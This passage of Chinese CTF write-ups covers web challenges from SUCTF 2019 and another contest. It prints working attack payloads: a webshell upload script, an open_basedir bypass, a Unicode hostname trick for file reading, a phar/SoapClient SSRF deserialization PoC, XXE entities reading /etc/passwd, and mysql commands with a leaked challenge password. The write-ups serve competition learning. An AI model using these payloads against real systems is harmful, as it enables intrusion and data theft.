class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">r = requests.post(url=url, data=data, files=files)<span class="comment">#proxies=proxies)</span></span><br><span class="line"><span class="keyword">print</span>(r.text) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'shell.cc'</span>,shell,<span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-2d83561c934fa626.png" alt></p>
<p>不过这题做了个open_basedir，刚好DE1CTF的时候用了一次，参考：<a href="https://xz.aliyun.com/t/4720，payload" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720，payload</a>:</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'img'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">print_r</span>(scandir(<span class="string">'/'</span>));</span><br><span class="line">#绕后用<span class="selector-tag">file_get_contents</span>读就好了</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-9cb9d7e7d961c49d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h3 id="0x03-Pythonginx"><a href="#0x03-Pythonginx" class="headerlink" title="0x03 Pythonginx"></a>0x03 Pythonginx</h3><p>题目源码(读来的)：</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, Blueprint, request, Response, escape ,render_template</span><br><span class="line">from urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit, unquote</span><br><span class="line">from urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta"># Index</span></span><br><span class="line">@app.route(<span class="string">'/'</span>, methods=[<span class="string">'GET'</span>])</span><br><span class="line">def app_index():<span class="type"></span></span><br><span class="line"><span class="type">    return render_template</span>(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/getUrl'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def getUrl():<span class="type"></span></span><br><span class="line"><span class="type">    url </span>= request.args.<span class="keyword">get</span>(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:<span class="type"></span></span><br><span class="line"><span class="type">        return </span>"我扌 your problem? <span class="number">111</span><span class="string">"</span></span><br><span class="line"><span class="string">    parts = list(urlsplit(url))</span></span><br><span class="line"><span class="string">    host = parts[1]</span></span><br><span class="line"><span class="string">    if host == 'suctf.cc':</span></span><br><span class="line"><span class="string">        return "</span>我扌 your problem? <span class="number">222</span> <span class="string">" + host</span></span><br><span class="line"><span class="string">    newhost = []</span></span><br><span class="line"><span class="string">    for h in host.split('.'):</span></span><br><span class="line"><span class="string">        newhost.append(h.encode('idna').decode('utf-8'))</span></span><br><span class="line"><span class="string">    parts[1] = '.'.join(newhost)</span></span><br><span class="line"><span class="string">    #去掉 url 中的空格</span></span><br><span class="line"><span class="string">    finalUrl = urlunsplit(parts).split(' ')[0]</span></span><br><span class="line"><span class="string">    host = parse.urlparse(finalUrl).hostname</span></span><br><span class="line"><span class="string">    if host == 'suctf.cc':</span></span><br><span class="line"><span class="string">        return urllib.request.urlopen(finalUrl).read()</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return "</span>我扌 your problem? <span class="number">333</span><span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == "</span>__main__<span class="string">":</span></span><br><span class="line"><span class="string">    app.run(host='0.0.0.0', port=80)</span></span><br></pre></td></tr></table></figure>

<p>看这个源码很简单，就是要你构造出第三次判断的时候是suctf.cc但是在前两个判断的时候又不能是suctf.cc，所以就是其中的字符在第三次判断前处理后要变成suctf.cc了。<br>参考：：<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf（阔以发现，这题的源码和里面的例子很像哦）" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf（阔以发现，这题的源码和里面的例子很像哦）</a><br>Unicode/Letterlike Symbols字符阔以从这取：<a href="https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols" target="_blank" rel="noopener">https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols</a></p>
<p>利用ℂ来替换.cc中的从c，在最后出来后会恢复成c,也就成功绕过了if判断，阔以修改个源码用来测试</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">import urllib</span><br><span class="line">from urllib import parse</span><br><span class="line">from urllib.parse import urlsplit, urlunsplit</span><br><span class="line"></span><br><span class="line"><span class="comment">#url = []</span></span><br><span class="line">url = <span class="string">"file://suctf.cℂ/../../../etc/passwd"</span></span><br><span class="line">host = parse.urlparse(url).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    print(<span class="string">'first'</span>)</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'1 '</span>+host)</span><br><span class="line">parts = list(urlsplit(url))</span><br><span class="line">host = parts[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    print(<span class="string">'sec'</span>)</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">2</span>)</span><br><span class="line">print(<span class="string">'2 '</span>+host)</span><br><span class="line">newhost = []</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">    newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line"><span class="comment">#去掉 url 中的空格</span></span><br><span class="line">finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">host = parse.urlparse(finalUrl).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">    print(<span class="string">'3 '</span>+host)</span><br><span class="line">    print(finalUrl)</span><br><span class="line">    <span class="comment">#print(urllib.request.urlopen(finalUrl).read())</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'???'</span>)</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-a8f13bb95f2257e5.png" alt></p>
<p>所以拿去题目打一波就阔以任意文件读取了，如下</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-98bfe0de4c4310c8.png" alt></p>
<p>接下来就是读各种文件（这里就不写辛酸过程，以及我们是如何丢了一血的了），必须喷一下/etc/hosts</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>	localhost</span><br><span class="line">::<span class="number">1</span>	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::<span class="number">0</span>	ip6-localnet</span><br><span class="line">ff00::<span class="number">0</span>	ip6-mcastprefix</span><br><span class="line">ff02::<span class="number">1</span>	ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span>	ip6-allrouters</span><br><span class="line"><span class="number">172.19.0.2</span>	2b44a80d20fc    这特么内网地址</span><br><span class="line"><span class="number">127.0.0.1</span>     suctf.cc</span><br></pre></td></tr></table></figure>
<p>看到了个内网地址，下意识以为是要日内网了，一直研究这个题目源码怎么ssrf，以及怎么日到没开端口的uwsgi，一度一位又是一个最新的技术，找了半天的骚操作。<br>读nginx配置 /etc/nginx/conf.d/nginx.conf(也没啥)</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="variable">@app</span> &#123;</span><br><span class="line"><span class="attribute">include</span> uwsgi_params;</span><br><span class="line"><span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /static &#123;</span><br><span class="line"><span class="attribute">alias</span> /app/static;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为什么丢一血就是在这，没去想读其他位置的配置文件<del>~</del><br>后来读/usr/local/nginx/conf/nginx.conf   就这个鬼东西</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="variable">@app</span> &#123;</span><br><span class="line"><span class="attribute">include</span> uwsgi_params;</span><br><span class="line"><span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /static &#123;</span><br><span class="line"><span class="attribute">alias</span> /app/static;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># location /flag &#123;</span></span><br><span class="line"><span class="comment"># alias /usr/fffffflag;      #flag就在这，竟然不在内网里！！！</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以读flag就好了</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-44f608314a9fa489.png" alt></p>
<p>（注：从今天开始收集字典，以后读东西都用字典来读）</p>
<h3 id="0x04-easy-sql"><a href="#0x04-easy-sql" class="headerlink" title="0x04 easy_sql"></a>0x04 easy_sql</h3><p>这题比较意外，题目和强网杯一样是一个堆叠注入，不过做了更多限制。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1;<span class="keyword">show</span> <span class="keyword">databases</span>;   <span class="comment">#查库</span></span><br><span class="line">1;<span class="keyword">show</span> <span class="keyword">tables</span>;      <span class="comment">#查表</span></span><br></pre></td></tr></table></figure>
<p>当前库只有一个Flag表，而且语句长度限制了40位，所以想要像强网一样的改表面和预编译的操作都不可以了，并且过滤了from等等（fuzz下就好了，这次放出了select），本以为语句是类似select xxx  from  xxx where id = （）这样的，结果后来听说泄露的是这样的</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">select</span> $<span class="variable">_GET</span>[<span class="string">'query'</span>] || <span class="built_in">flag</span> <span class="keyword">from</span> <span class="built_in">flag</span></span><br></pre></td></tr></table></figure>
<p>我拿flag的时候就是输了个</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">*,<span class="number">1</span>      这东西我都觉得神了，这都出了</span><br></pre></td></tr></table></figure>

<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-b7afd0fcb8f2c52a.png" alt></p>
<p>所以没毛病，这个确实能出。</p>
<h3 id="0x05-upload-lib2"><a href="#0x05-upload-lib2" class="headerlink" title="0x05 upload lib2"></a>0x05 upload lib2</h3><p>由于木有时间，这题木有去看，所以就是记录下复现过程了，题目给了源码，所以就是进行代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        getFlag(<span class="keyword">$this</span>-&gt;ip, <span class="keyword">$this</span>-&gt;port);</span><br><span class="line">        <span class="comment">//使用你自己的服务器监听一个确保可以收到消息的端口来获取flag</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br><span class="line">        </span><br><span class="line">        $ip = $_POST[<span class="string">'ip'</span>];     <span class="comment">//你用来获取flag的服务器ip</span></span><br><span class="line">        $port = $_POST[<span class="string">'port'</span>]; <span class="comment">//你用来获取flag的服务器端口</span></span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">'clazz'</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">'func1'</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">'func2'</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">'func3'</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">'arg1'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg2'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg3'</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>也就是说需要通过SSRF来反序列化触发getFlag函数，所以继续查看代码</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">    function getMIME()&#123;</span><br><span class="line">        <span class="variable">$finfo</span> = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="variable">$this</span>-&gt;type = finfo_file(<span class="variable">$finfo</span>, <span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close(<span class="variable">$finfo</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure>
<p>参考zsx的文章：<a href="https://blog.zsxsoft.com/post/38，查看finfo_file的底层代码" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38，查看finfo_file的底层代码</a></p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-2eb4eb4e3879ec67.png" alt></p>
<p>阔以发现finfo_file也调用了，所以finfo_file也是能够触发phar反序列化的，那么就可以利用SoapClient来通过SSRF以POST方式访问到admin.php文件。不过在func.php中又做了限制</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $file_path = $_POST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">        $file = <span class="keyword">new</span> File($file_path);</span></span><br><span class="line"><span class="php">        $file-&gt;getMIME();</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>phar协议不能出现在开头，还是zxs那篇文章里写的</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-c0a0e47b6a5acf50.png" alt></p>
<p>也就是说阔以构造绕过一下来调用phar协议，这里的吹一下altman(<a href="https://altman.vip/)，fuzz到一个可以利用的方法" target="_blank" rel="noopener">https://altman.vip/)，fuzz到一个可以利用的方法</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/resource=phar:/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure>
<p>所以接下来就是生成一个phar脚本，上传后通过func触发就好了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file_name;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $type;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file_name = <span class="keyword">array</span>(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; <span class="string">"http://127.0.0.1/admin.php"</span>, <span class="string">'uri'</span> =&gt; <span class="string">"c"</span>, <span class="string">'user_agent'</span> =&gt; <span class="string">"catcat\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 133\r\n\r\nip=[yourip]&amp;port=[port]&amp;admin=1&amp;clazz=ArrayIterator&amp;func1=append&amp;func2=append&amp;func3=append&amp;arg1=1&amp;arg2=1&amp;arg3=1\r\n\r\n\r\n"</span>));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$o = <span class="keyword">new</span> File();</span></span><br><span class="line"><span class="php">$phar=<span class="keyword">new</span> Phar(<span class="string">'poc.phar'</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">$phar-&gt;setStub(<span class="string">"GIF89a&lt; ?php __HALT_COMPILER(); ?&gt;"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;setMetadata($o);</span></span><br><span class="line"><span class="php">$phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;stopBuffering();</span></span><br></pre></td></tr></table></figure>
<p>绕后改个后缀上传，vps上监听一下端口，到func.php触发就可以了</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-385183b39aa436c5.png" alt></p>
<h3 id="0x06-Cocktail’s-Remix"><a href="#0x06-Cocktail’s-Remix" class="headerlink" title="0x06 Cocktail’s Remix"></a>0x06 Cocktail’s Remix</h3><p>赛后才开始看，题目放了一个robots.txt</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> /info.php</span><br><span class="line"><span class="string">Disallow:</span> /download.php</span><br><span class="line"><span class="string">Disallow:</span> /config.php</span><br></pre></td></tr></table></figure>
<p>给了个phpinfo页面以及一个download.php（抓包看一下可以知道是可以构造成任意文件下载的）</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-399e3b6a8c8c1990.png" alt></p>
<p>通过payload:<code>download.php?filename=xxxx</code>实现任意文件读取，开始读各种配置文件。</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">#/etc/hosts</span><br><span class="line"><span class="number">127.0.0.1</span> localhost</span><br><span class="line">::<span class="number">1</span> localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::<span class="number">0</span> ip6-localnet</span><br><span class="line">ff00::<span class="number">0</span> ip6-mcastprefix</span><br><span class="line">ff02::<span class="number">1</span> ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span> ip6-allrouters</span><br><span class="line"><span class="number">172.77.120.11</span> MysqlServer</span><br><span class="line"><span class="number">172.77.120.10</span> f8a7f2ca8591     又是内网地址</span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># download.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">header(<span class="string">"Content-Disposition: attachment;filename="</span>.$filename);</span><br><span class="line">header(<span class="string">'Content-Length: '</span>.filesize($filename));</span><br><span class="line">readfile($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="regexp">//</span><span class="variable">$db_server</span> = <span class="string">"MysqlServer"</span>;</span><br><span class="line"><span class="regexp">//</span><span class="variable">$db_username</span> = <span class="string">"dba"</span>;</span><br><span class="line"><span class="regexp">//</span><span class="variable">$db_password</span> = <span class="string">"rNhHmmNkN3xu4MBYhm"</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>题目给phpinfo页面肯定是要我们去看上面的部分信息的</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-f320690c3de21a8c.png" alt></p>
<p>其中加载了一个mod_cocktail（这个东西要是不说他是后门我就去想办法日内网了）模块，下载下来用ida看看，路径：<code>/usr/lib/apache2/modules/mod_cocktail.so</code>。</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-ef2867d800f8cc85.png" alt></p>
<p>逆向师傅说这就是一个header的后门，获取Reffer字段的值，base64解码后直接放bash中运行，所以就阔以执行任意命令执行了</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-d46e46e40e87f6e3.png" alt></p>
<p>操作了一番，发现木有权限写shell，也没法反弹shell出来。</p>
<p><img src="/2019/08/19/2019-SUCTF-Web-writeup/8418106-1605b362db0f68d2.png" alt></p>
<p>在config给了数据库的服务器和配置信息，所以flag应该是要去数据库中，所以利用数据库连接语句去查库</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">#mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e <span class="string">"show databases;"</span> &gt; <span class="regexp">/tmp/</span><span class="keyword">read</span>.txt</span><br><span class="line"></span><br><span class="line">Database</span><br><span class="line">information_schema</span><br><span class="line">flag</span><br></pre></td></tr></table></figure>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta">#mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e <span class="meta-string">"use flag;select * from flag"</span> &gt; /tmp/read.txt</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">flag</span></span><br><span class="line"><span class="built_in">flag</span>&#123;Ea3y_apAcH3_m0d_BaCkd00rx_fLaG&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x07-iCloudMusic"><a href="#0x07-iCloudMusic" class="headerlink" title="0x07 iCloudMusic"></a>0x07 iCloudMusic</h3><p><strong>这个不会了，大师傅们赛中差一步就出，等贴大师傅们的链接了</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>.htaccess</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>中关村第三届新兴领域专题赛网络与信息安全领域专项赛Web_WP</title>
    <url>/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/</url>
    <content><![CDATA[<h3 id="0x01-Game"><a href="#0x01-Game" class="headerlink" title="0x01 Game"></a>0x01 Game</h3><p>这题迷得很，查看下一下js，按着ajax发送请求得条件自己发一个请求就好了</p>
<p><img src="/2019/08/15/%E4%B8%AD%E5%85%B3%E6%9D%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%96%B0%E5%85%B4%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A2%98%E8%B5%9B%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb-WP/8418106-e70774e2e39d1c0a.png" alt></p>
<p>payload:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/socre.php</span><br><span class="line">POST:<span class="attribute">score</span>=15</span><br></pre></td></tr></table></figure>

<h3 id="0x02-who-are-you"><a href="#0x02-who-are-you" class="headerlink" title="0x02 who_are_you"></a>0x02 who_are_you</h3><p>XXE的题目，没有任何限制，直接任意文件读取……</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以读到passwd的信息，所以主要就是找到flag就好了，最后是在index.php里找到了flag，由于php文件里有&lt;等特殊字符，所以利用file协议读的时候会出现解析错误导致没有回显，所以换一个编码的协议读就好了比如php://filter</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/convert.base64-encode/resource=index.php"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>index.php源码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">libxml_disable_entity_loader(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">$data = @file_get_contents(<span class="string">'php://input'</span>);</span></span><br><span class="line"><span class="php">$resp = <span class="string">''</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//$flag='flag&#123;1900cb98-96c4-45ac-a22e-86da06d59a3e&#125;';</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span></span><br><span class="line"><span class="php">    $dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span></span><br><span class="line"><span class="php">    ob_start();</span></span><br><span class="line"><span class="php">    $res  = $dom-&gt;textContent;</span></span><br><span class="line"><span class="php">    $resp = ob_get_contents();</span></span><br><span class="line"><span class="php">    ob_end_clean();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($res)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>($res);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span 